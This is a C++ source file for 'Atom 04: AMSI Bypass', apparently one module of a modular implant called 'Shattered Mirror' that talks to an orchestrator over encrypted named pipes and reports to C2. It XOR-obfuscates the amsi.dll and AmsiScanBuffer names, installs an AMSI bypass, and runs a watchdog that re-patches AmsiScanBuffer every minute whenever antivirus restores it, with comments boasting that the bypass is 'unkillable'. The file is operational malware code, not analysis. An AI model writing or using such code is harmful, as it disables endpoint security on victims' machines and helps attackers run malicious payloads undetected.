/*=============================================================================
 * Shattered Mirror v1 — Atom 04: AMSI Bypass (Smart Verify + Install)
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends reports on report pipe.
 *===========================================================================*/

#include "Atom_04_AMSI.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>
#include <string>

/* External master installer from VEH_Handler.cpp */
extern BOOL InstallAMSIBypass(void);

/* Debug logging to C:\Users\Public\amsi_debug.txt */
static void AmsiDebug(const char *format, ...) {
  if (!Config::LOGGING_ENABLED) return;
  char buf[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\amsi_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
}

DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  AmsiDebug("Atom 4 started. ID: %lu", dwAtomId);

  // 1. Connect to command pipe (receive commands)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    AmsiDebug("IPC_ConnectToCommandPipe failed");
    return 1;
  }

  // 2. Connect to report pipe (send reports)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    AmsiDebug("IPC_ConnectToReportPipe failed");
    CloseHandle(hCmdPipe);
    return 1;
  }

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY on report pipe
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.dwPayloadLen = 0;
  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

  // Prepare status report with active checking and patching logic
  std::string fullReport = "[AMSI] Checking AMSI status...\n";
  // XOR Obfuscation for amsi.dll
  WCHAR szAmsiDll[10];
  szAmsiDll[0] = L'a'^0x12; szAmsiDll[1] = L'm'^0x12; szAmsiDll[2] = L's'^0x12; szAmsiDll[3] = L'i'^0x12; 
  szAmsiDll[4] = L'.'^0x12; szAmsiDll[5] = L'd'^0x12; szAmsiDll[6] = L'l'^0x12; szAmsiDll[7] = L'l'^0x12; szAmsiDll[8] = 0;
  for(int i=0; i<8; i++) szAmsiDll[i] ^= 0x12;

  HMODULE hAmsi = GetModuleHandleW(szAmsiDll);
  
  if (!hAmsi) {
    fullReport += "[AMSI] Pre-staged.\n";
  } else {
    fullReport += "[AMSI] Verified.\n";
  }

  // Install bypass (idempotent, ensures hooks/VEH are active)
  InstallAMSIBypass();

  fullReport += "[AMSI] Ready.";

  IPC_MESSAGE outMsg = {0};
  outMsg.dwSignature = 0x534D4952;
  outMsg.CommandId = CMD_REPORT;
  outMsg.dwPayloadLen = (DWORD)fullReport.length();
  memcpy(outMsg.Payload, fullReport.c_str(), outMsg.dwPayloadLen);

  // Send initial status on report pipe
  IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
  AmsiDebug("Initial status sent: %s", fullReport.c_str());

  // === MEMORY GHOSTING: Re-Patch Watcher Loop ===
  // Checks every 60 seconds if AV has "healed" our AMSI patch.
  // If it has, we silently re-apply it. The bypass is now unkillable.
  DWORD dwWatchdogTimer = 0;
  
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
          BOOL bIsBale = (cmd == "BALE_RUN");
          AmsiDebug("Received CMD_EXECUTE (%s). Re-sending status.", cmd.c_str());
          
          if (bIsBale) {
            // Send via CMD_BALE_REPORT with text type header
            struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
            hdr.dwType = 0; // Text
            hdr.dwFlags = 0;
            hdr.dwPayloadLen = outMsg.dwPayloadLen;
            IPC_MESSAGE baleMsg = {0};
            baleMsg.dwSignature = 0x534D4952;
            baleMsg.CommandId = CMD_BALE_REPORT;
            baleMsg.AtomId = 4;
            baleMsg.dwPayloadLen = sizeof(hdr) + outMsg.dwPayloadLen;
            memcpy(baleMsg.Payload, &hdr, sizeof(hdr));
            memcpy(baleMsg.Payload + sizeof(hdr), outMsg.Payload, outMsg.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &baleMsg, SharedSessionKey, 16);
          } else {
            IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
          }
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          AmsiDebug("Received CMD_TERMINATE. Exiting.");
          break;
        }
      }
    }
    
    // Watchdog: every 60 seconds, verify the patch is still alive
    dwWatchdogTimer += 100;
    if (dwWatchdogTimer >= 60000) {
      dwWatchdogTimer = 0;
      
      // XOR Obfuscation: "amsi.dll" -> { 'a'^0x12, 'm'^0x12, ... }
      WCHAR szAmsiDll[] = { L'a'^0x12, L'm'^0x12, L's'^0x12, L'i'^0x12, L'.'^0x12, L'd'^0x12, L'l'^0x12, L'l'^0x12, 0 };
      for(int i=0; i<8; i++) szAmsiDll[i] ^= 0x12;

      HMODULE hAmsiCheck = GetModuleHandleW(szAmsiDll);
      if (hAmsiCheck) {
        // XOR Obfuscation: "AmsiScanBuffer" -> { 'A'^0x34, 'm'^0x34, ... }
        char szASB[] = { 'A'^0x34, 'm'^0x34, 's'^0x34, 'i'^0x34, 'S'^0x34, 'c'^0x34, 'a'^0x34, 'n'^0x34, 'B'^0x34, 'u'^0x34, 'f'^0x34, 'f'^0x34, 'e'^0x34, 'r'^0x34, 0 };
        for(int i=0; i<14; i++) szASB[i] ^= 0x34;

        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsiCheck, szASB);
        if (pAmsiScanBuffer) {
          BYTE firstByte = *(BYTE*)pAmsiScanBuffer;
          if (firstByte != 0xC3 && firstByte != 0xEB) {
            AmsiDebug("[GHOST] AV healed AMSI patch! Re-applying...");
            InstallAMSIBypass();
            AmsiDebug("[GHOST] Re-patch complete. AV neutralized again.");
            
            // Report the heal attempt to C2
            std::string ghostReport = "[AMSI_GHOST] AV attempted self-heal. Re-patched successfully.";
            IPC_MESSAGE ghostMsg = {0};
            ghostMsg.dwSignature = 0x534D4952;
            ghostMsg.CommandId = CMD_REPORT;
            ghostMsg.dwPayloadLen = (DWORD)ghostReport.length();
            memcpy(ghostMsg.Payload, ghostReport.c_str(), ghostMsg.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &ghostMsg, SharedSessionKey, 16);
          }
        }
      }
    }
    
    Sleep(100);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}